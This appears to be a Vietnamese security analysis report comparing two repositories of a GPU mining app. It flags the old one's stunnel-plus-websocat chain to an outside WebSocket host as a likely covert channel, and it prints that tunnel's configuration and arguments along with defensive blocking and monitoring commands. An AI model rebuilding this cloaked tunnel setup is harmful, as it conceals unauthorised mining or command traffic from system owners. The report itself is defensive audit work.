# 🔍 BÁO CÁO PHÂN TÍCH CƠ CHẾ PROXY VÀ MINING

## 📋 TÓM TẮT ĐIỀU TRA

**Ngày phân tích**: September 29, 2024
**Phạm vi**: So sánh cơ chế proxy/tunnel giữa repository cũ và mới
**Kết luận**: Repository mới **KHÔNG triển khai** cơ chế proxy/stunnel như repository cũ

---

## 🏗️ PHÂN TÍCH REPOSITORY CŨ

### 1. Module setup_env.py Analysis

**File**: `/home/azureuser/opus-gpu/app/mining_environment/scripts/setup_env.py`

#### Cơ chế Security Configuration:

```python
def configure_security(logger):
    """
    Khởi chạy Websocat (WebSocket proxy) và Stunnel (TLS tunnel)
    cho strainingmodules.tech với auto-restart monitoring
    """
```

#### Các thành phần chính:

1. **Websocat Configuration** (dòng 359-420):
   - **Listen**: `127.0.0.1:5556`
   - **Remote**: `wss://strainingmodules.tech/ws`
   - **Mode**: Binary với verbose logging
   - **Auto-restart**: Có monitoring thread tự động khởi động lại
   - **Environment**: Loại bỏ LD_PRELOAD/DYLD_INSERT_LIBRARIES

2. **Stunnel Configuration** (dòng 422-444):
   - **Config path**: `/etc/stunnel/stunnel.conf`
   - **Binary**: Tìm `stunnel` hoặc `stunnel4`
   - **Process**: Chạy daemon với PID tracking

3. **Health Monitoring** (dòng 296-347):
   ```python
   def monitor_websocat_health():
       restart_count = 0
       max_restarts = 5
       # Check every 30 seconds
       # Auto-restart if process dies
   ```

### 2. Stunnel Configuration Analysis

**File**: `/home/azureuser/opus-gpu/app/stunnel.conf`

```conf
[mlls_cuda]
accept = 127.0.0.1:4444    # Local listener
connect = 127.0.0.1:5556   # Forward to Websocat
cert = /etc/stunnel/soff.crt
key  = /etc/stunnel/soff.key
```

### 3. Luồng kết nối (Connection Flow):

```
Mining App → localhost:4444 (Stunnel)
           → localhost:5556 (Websocat)
           → wss://strainingmodules.tech/ws
```

**Mục đích nghi ngờ**:
- Kết nối tới domain `strainingmodules.tech` qua WebSocket bảo mật
- Sử dụng TLS tunnel để che giấu traffic
- Auto-restart để duy trì kết nối liên tục

---

## 🆕 PHÂN TÍCH REPOSITORY MỚI (app-gpu)

### 1. Production Code Analysis

**File**: `/home/azureuser/opus-gpu/app/app-gpu/src/production.rs`

**Kết quả**:
- ✅ **KHÔNG CÓ** import hay sử dụng stunnel
- ✅ **KHÔNG CÓ** websocat configuration
- ✅ **KHÔNG CÓ** kết nối tới strainingmodules.tech
- ✅ Chỉ có HTTP API server local (port 8080/8082)

### 2. Config Module Analysis

**File**: `/home/azureuser/opus-gpu/app/app-gpu/src/common/config.rs`

**Proxy Configuration** được định nghĩa nhưng:
```rust
pub struct NetworkCloakingConfig {
    pub use_proxy: bool,           // Default: false
    pub proxy_config: Option<ProxyConfig>,  // Default: None
    pub obfuscate_traffic: bool,   // Default: false
}
```

**Quan trọng**:
- Proxy configuration **chỉ là stub/placeholder**
- **KHÔNG được triển khai** trong production code
- Default values đều là `false`/`None`

### 3. Kiểm tra toàn bộ codebase:

```bash
grep -r "proxy\|stunnel\|websocat\|strainingmodules" /home/azureuser/opus-gpu/app/app-gpu
```

**Kết quả**:
- 3 files có đề cập "proxy"
- 0 files có "stunnel", "websocat", "strainingmodules"
- Các đề cập proxy chỉ trong documentation và config stub

---

## ⚠️ PHÁT HIỆN QUAN TRỌNG

### Repository Cũ (Nghi vấn):

1. **Kết nối ẩn**: Sử dụng multi-layer proxy để che giấu destination
2. **Domain đáng ngờ**: `strainingmodules.tech` không rõ mục đích
3. **Auto-restart aggressiv**: Duy trì kết nối liên tục với max 5 retries
4. **Obfuscation**: Loại bỏ LD_PRELOAD traces, sử dụng binary mode

### Repository Mới (Sạch):

1. **Không có proxy**: Chỉ chạy local HTTP server
2. **Không có external connection**: Không kết nối tới domain lạ
3. **Transparent operation**: Code rõ ràng, dễ audit
4. **Legitimate mining simulation**: Chỉ simulate hashrate, không thực sự mine

---

## 🔐 ĐÁNH GIÁ BẢO MẬT

### Risk Assessment:

| Aspect | Repository Cũ | Repository Mới |
|--------|--------------|----------------|
| **External Connections** | ❌ Có (strainingmodules.tech) | ✅ Không |
| **Proxy/Tunnel Usage** | ❌ Có (Stunnel + Websocat) | ✅ Không |
| **Traffic Obfuscation** | ❌ Có | ✅ Không |
| **Code Transparency** | ❌ Obfuscated | ✅ Clear |
| **Auto-restart Logic** | ❌ Aggressive | ✅ None |
| **Security Risk** | 🔴 **HIGH** | 🟢 **LOW** |

### Khuyến nghị:

1. **KHÔNG SỬ DỤNG** repository cũ với cơ chế proxy/stunnel
2. **SỬ DỤNG** repository mới (app-gpu) đã được làm sạch
3. **BLOCK** domain `strainingmodules.tech` trong firewall
4. **AUDIT** logs để kiểm tra xem có connection nào tới domain này không

---

## 🎯 KẾT LUẬN

### Repository Cũ:
- **NGHI NGỜ CAO**: Có dấu hiệu của backdoor/botnet
- Sử dụng proxy layers để che giấu communication
- Kết nối tới domain không rõ mục đích
- Auto-restart aggressive để maintain persistent connection

### Repository Mới (app-gpu):
- **AN TOÀN**: Không có proxy/tunnel mechanism
- Code transparent và dễ audit
- Chỉ chạy local services
- Mining simulation legitimate không có external dependencies

### Hành động đề xuất:

1. **Immediate**:
   ```bash
   # Kill any stunnel/websocat processes
   pkill -f stunnel
   pkill -f websocat

   # Block suspicious domain
   echo "127.0.0.1 strainingmodules.tech" >> /etc/hosts
   ```

2. **Firewall Rules**:
   ```bash
   # Block outbound to suspicious IPs/domains
   iptables -A OUTPUT -d strainingmodules.tech -j DROP
   ```

3. **Monitoring**:
   ```bash
   # Check for any connections
   netstat -antp | grep -E "5556|4444"
   lsof -i :5556
   lsof -i :4444
   ```

---

## 📊 TECHNICAL DETAILS

### Websocat Process (Repository Cũ):

```python
websocat_args = [
    'websocat',
    '-v',  # Verbose
    '--binary',  # Binary mode
    f"tcp-l:127.0.0.1:5556",  # Local listener
    'wss://strainingmodules.tech/ws'  # Remote WebSocket
]
```

### Stunnel Chain:
```
Local App → 127.0.0.1:4444 (Stunnel TLS)
         → 127.0.0.1:5556 (Websocat)
         → wss://strainingmodules.tech/ws (External)
```

### Repository Mới - Clean Architecture:
```
Mining Engine → Local HTTP API (8080/8082)
              → Prometheus Metrics (9090)
              → No External Connections ✅
```

---

**Report Date**: September 29, 2024
**Risk Level**: Repository Cũ = HIGH | Repository Mới = LOW
**Recommendation**: Chỉ sử dụng repository mới tại `/home/azureuser/opus-gpu/app/app-gpu`